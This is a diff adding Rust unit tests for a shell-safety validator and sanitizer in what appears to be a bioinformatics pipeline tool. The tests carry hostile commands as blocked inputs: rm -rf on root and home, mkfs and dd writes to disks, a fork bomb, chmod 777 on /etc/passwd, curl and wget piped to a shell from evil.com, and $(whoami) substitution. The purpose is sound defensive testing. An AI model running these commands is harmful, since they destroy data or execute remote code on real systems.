@@ -353,3 +353,321 @@ fn validate_wildcard_injection_blocks_command_substitution() {
     values.insert("sample".to_string(), "$(whoami)".to_string());
     assert!(validate_wildcard_injection(&values).is_err());
 }
+
+// ---------------------------------------------------------------------------
+// validate_shell_safety — bypass attempt tests
+// ---------------------------------------------------------------------------
+
+#[test]
+fn validate_shell_safety_blocks_rm_rf_with_no_preserve_root() {
+    assert!(
+        validate_shell_safety("rm -rf --no-preserve-root /").is_err(),
+        "should block rm -rf --no-preserve-root /"
+    );
+}
+
+#[test]
+fn validate_shell_safety_blocks_rm_rf_extra_spaces() {
+    assert!(
+        validate_shell_safety("rm  -rf  /").is_err(),
+        "should block rm  -rf  / (extra spaces)"
+    );
+}
+
+#[test]
+fn validate_shell_safety_blocks_rm_rf_home_data() {
+    assert!(
+        validate_shell_safety("rm -rf ~/data").is_err(),
+        "should block rm -rf ~/data"
+    );
+}
+
+#[test]
+fn validate_shell_safety_blocks_rm_rf_tilde() {
+    assert!(
+        validate_shell_safety("rm -rf ~").is_err(),
+        "should block rm -rf ~"
+    );
+}
+
+#[test]
+fn validate_shell_safety_blocks_rm_r_root() {
+    assert!(
+        validate_shell_safety("rm -r /").is_err(),
+        "should block rm -r /"
+    );
+}
+
+#[test]
+fn validate_shell_safety_blocks_mkfs_ext4() {
+    assert!(
+        validate_shell_safety("mkfs.ext4 /dev/sda").is_err(),
+        "should block mkfs.ext4 /dev/sda"
+    );
+}
+
+#[test]
+fn validate_shell_safety_blocks_mkfs_btrfs() {
+    assert!(
+        validate_shell_safety("mkfs.btrfs /dev/sdb1").is_err(),
+        "should block mkfs.btrfs"
+    );
+}
+
+#[test]
+fn validate_shell_safety_blocks_mkswap() {
+    assert!(
+        validate_shell_safety("mkswap /dev/sda1").is_err(),
+        "should block mkswap"
+    );
+}
+
+#[test]
+fn validate_shell_safety_blocks_dd_to_block_device() {
+    assert!(
+        validate_shell_safety("dd if=/dev/zero of=/dev/sda bs=1M").is_err(),
+        "should block dd to block device"
+    );
+}
+
+#[test]
+fn validate_shell_safety_blocks_chmod_r_777() {
+    assert!(
+        validate_shell_safety("chmod -R 777 /").is_err(),
+        "should block chmod -R 777 /"
+    );
+}
+
+#[test]
+fn validate_shell_safety_blocks_chmod_777_etc() {
+    assert!(
+        validate_shell_safety("chmod 777 /etc/passwd").is_err(),
+        "should block chmod 777 /etc/passwd"
+    );
+}
+
+#[test]
+fn validate_shell_safety_blocks_wget_pipe_sh() {
+    assert!(
+        validate_shell_safety("wget -O- http://evil.com/script.sh | sh").is_err(),
+        "should block wget pipe to sh"
+    );
+}
+
+#[test]
+fn validate_shell_safety_blocks_curl_pipe_bash() {
+    assert!(
+        validate_shell_safety("curl -s http://evil.com | bash").is_err(),
+        "should block curl pipe to bash"
+    );
+}
+
+#[test]
+fn validate_shell_safety_blocks_curl_pipe_sudo() {
+    assert!(
+        validate_shell_safety("curl http://evil.com | sudo bash").is_err(),
+        "should block curl pipe to sudo"
+    );
+}
+
+#[test]
+fn validate_shell_safety_blocks_block_device_write_redirect() {
+    assert!(
+        validate_shell_safety("echo test > /dev/sda").is_err(),
+        "should block direct write to /dev/sda"
+    );
+}
+
+#[test]
+fn validate_shell_safety_blocks_block_device_append_redirect() {
+    assert!(
+        validate_shell_safety("echo test >> /dev/sdb1").is_err(),
+        "should block append to /dev/sdb1"
+    );
+}
+
+#[test]
+fn validate_shell_safety_blocks_fork_bomb() {
+    assert!(
+        validate_shell_safety(":(){ :|:& };:").is_err(),
+        "should block fork bomb"
+    );
+}
+
+#[test]
+fn validate_shell_safety_blocks_dd_from_dev_random() {
+    assert!(
+        validate_shell_safety("dd if=/dev/random of=output.dat bs=1024").is_err(),
+        "should block dd from /dev/random"
+    );
+}
+
+#[test]
+fn validate_shell_safety_blocks_dd_from_dev_urandom() {
+    assert!(
+        validate_shell_safety("dd if=/dev/urandom of=output.bin bs=4096").is_err(),
+        "should block dd from /dev/urandom"
+    );
+}
+
+#[test]
+fn validate_shell_safety_blocks_mkfs_plain() {
+    assert!(
+        validate_shell_safety("mkfs /dev/sda").is_err(),
+        "should block plain mkfs"
+    );
+}
+
+#[test]
+fn validate_shell_safety_blocks_wget_pipe_dash() {
+    assert!(
+        validate_shell_safety("wget -qO- http://evil.net/payload | dash").is_err(),
+        "should block wget pipe to dash"
+    );
+}
+
+#[test]
+fn validate_shell_safety_allows_rm_rf_relative_path() {
+    assert!(
+        validate_shell_safety("rm -rf output_dir/").is_ok(),
+        "should allow rm -rf with relative path"
+    );
+}
+
+#[test]
+fn validate_shell_safety_allows_dd_normal_usage() {
+    assert!(
+        validate_shell_safety("dd if=input.fastq of=output.fastq bs=1M").is_ok(),
+        "should allow normal dd usage"
+    );
+}
+
+#[test]
+fn validate_shell_safety_allows_bwa_mem() {
+    assert!(
+        validate_shell_safety("bwa mem ref.fa reads.fq > out.sam").is_ok(),
+        "should allow bwa mem with redirect"
+    );
+}
+
+#[test]
+fn validate_shell_safety_allows_samtools_sort() {
+    assert!(
+        validate_shell_safety("samtools sort in.bam -o out.bam").is_ok(),
+        "should allow samtools sort"
+    );
+}
+
+#[test]
+fn validate_shell_safety_allows_echo_hello() {
+    assert!(
+        validate_shell_safety("echo hello").is_ok(),
+        "should allow echo hello"
+    );
+}
+
+#[test]
+fn validate_shell_safety_allows_fastp() {
+    assert!(
+        validate_shell_safety("fastp -i in.fq -o out.fq").is_ok(),
+        "should allow fastp with pipes and flags"
+    );
+}
+
+#[test]
+fn validate_shell_safety_allows_pipe_chaining() {
+    assert!(
+        validate_shell_safety("cat reads.fq | fastp -o out.fq").is_ok(),
+        "should allow pipe chaining (common bioinformatics idiom)"
+    );
+}
+
+#[test]
+fn validate_shell_safety_allows_semicolons() {
+    assert!(
+        validate_shell_safety("echo start; bwa mem ref.fa reads.fq > out.sam; echo done").is_ok(),
+        "should allow semicolons (common bioinformatics idiom)"
+    );
+}
+
+#[test]
+fn validate_shell_safety_allows_double_ampersand() {
+    assert!(
+        validate_shell_safety("bwa index ref.fa && bwa mem ref.fa reads.fq > out.sam").is_ok(),
+        "should allow && chaining"
+    );
+}
+
+#[test]
+fn validate_shell_safety_allows_rm_relative_without_root() {
+    assert!(
+        validate_shell_safety("rm -rf results/").is_ok(),
+        "should allow rm -rf with non-root relative path"
+    );
+}
+
+// ---------------------------------------------------------------------------
+// sanitize_shell_command tests
+// ---------------------------------------------------------------------------
+
+#[test]
+fn sanitize_shell_command_detects_command_substitution() {
+    let warnings = sanitize_shell_command("echo $(whoami)");
+    assert!(
+        warnings
+            .iter()
+            .any(|w| w.contains("Command substitution detected")),
+        "should warn on $()"
+    );
+}
+
+#[test]
+fn sanitize_shell_command_detects_backtick() {
+    let warnings = sanitize_shell_command("echo `whoami`");
+    assert!(
+        warnings
+            .iter()
+            .any(|w| w.contains("Backtick command substitution detected")),
+        "should warn on backticks"
+    );
+}
+
+#[test]
+fn sanitize_shell_command_detects_dev_redirect() {
+    let warnings = sanitize_shell_command("echo test >/dev/null");
+    assert!(
+        warnings
+            .iter()
+            .any(|w| w.contains("Redirect to /dev/ detected")),
+        "should warn on >/dev/ redirect"
+    );
+}
+
+#[test]
+fn sanitize_shell_command_detects_eval() {
+    let warnings = sanitize_shell_command("eval echo hello");
+    assert!(
+        warnings.iter().any(|w| w.contains("eval usage detected")),
+        "should warn on eval"
+    );
+}
+
+#[test]
+fn sanitize_shell_command_no_false_positives_simple_cmd() {
+    let warnings = sanitize_shell_command("echo hello world");
+    assert!(
+        warnings.is_empty(),
+        "should not warn on simple commands: {:?}",
+        warnings
+    );
+}
+
+#[test]
+fn sanitize_shell_command_no_false_positives_bioinformatics() {
+    let warnings = sanitize_shell_command("bwa mem ref.fa reads.fq > out.sam");
+    assert!(
+        warnings.is_empty(),
+        "should not warn on bioinformatics commands: {:?}",
+        warnings
+    );
+}
